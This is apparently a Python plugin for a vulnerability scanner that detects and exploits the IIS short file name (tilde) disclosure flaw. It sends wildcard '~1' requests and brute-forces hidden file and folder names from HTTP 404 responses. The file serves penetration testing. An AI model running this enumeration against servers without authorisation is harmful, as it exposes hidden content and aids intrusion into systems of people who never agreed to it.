#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

import urllib.parse
import requests
import queue
requests.packages.urllib3.disable_warnings()

def get_script_info(data=None):
    script_info = {
        "name": "iis short file",
        "info": "iis short file.",
        "level": "low",
        "type": "info"
    }
    return script_info



def prove(data):
    data = init(data,'web')
    if data['url']:
        status_1 = _get_status(data['url']+ '/*~1*/a.aspx', data['headers'], data['timeout']) # an existed file/folder
        status_2 = _get_status(data['url'] + '/l1j1e*~1*/a.aspx', data['headers'], data['timeout']) # not existed file/folder
        if status_1 == 404 and status_2 != 404:
            data['flag'] = 1
            data['data'].append({"url": data['url']+ '/*~1*/a.aspx'})
            data['res'].append({"info": '/*~1*/a.aspx', "key": 'iis_short_file'})

    return data

def exec(data):
    data = init(data, 'web')
    if data['url']:
        q = queue.Queue()
        alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        path = data['url'] if data['url'][-1] == '/' else  data['url'] + '/'
        for c in alphanum:
            q.put( (path + c, '.*') )    # filename, extension
        while True:
            if q.qsize() <= 0:
                break
            url, ext = q.get(timeout=1.0)
            status = _get_status(url + '*~1' + ext + '/1.aspx', data['headers'], data['timeout'])
            if status == 404:
                if len(url) - len(path) < 6:  # enum first 6 chars only
                    for c in alphanum:
                        q.put((url + c, ext))
                else:
                    if ext == '.*':
                        q.put((url, ''))

                    if ext == '':
                        data['flag'] = 1
                        data['res'].append({"info": url + '~1', "key": 'iis_short_file for Dir'})

                    elif len(ext) == 5 or (not ext.endswith('*')):  # .asp*
                        data['flag'] = 1
                        data['res'].append({"info":  url + '~1' + ext, "key": 'iis_short_file for File'})

                    else:
                        for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                            q.put((url, ext[:-1] + c + '*'))
                            if len(ext) < 4:  # < len('.as*')
                                q.put((url, ext[:-1] + c))
    return data



def _get_status(url,headers,timeout):
    try:
        res = requests.get(url, headers=headers, timeout=timeout).status_code
    except:
        res = 0
    return res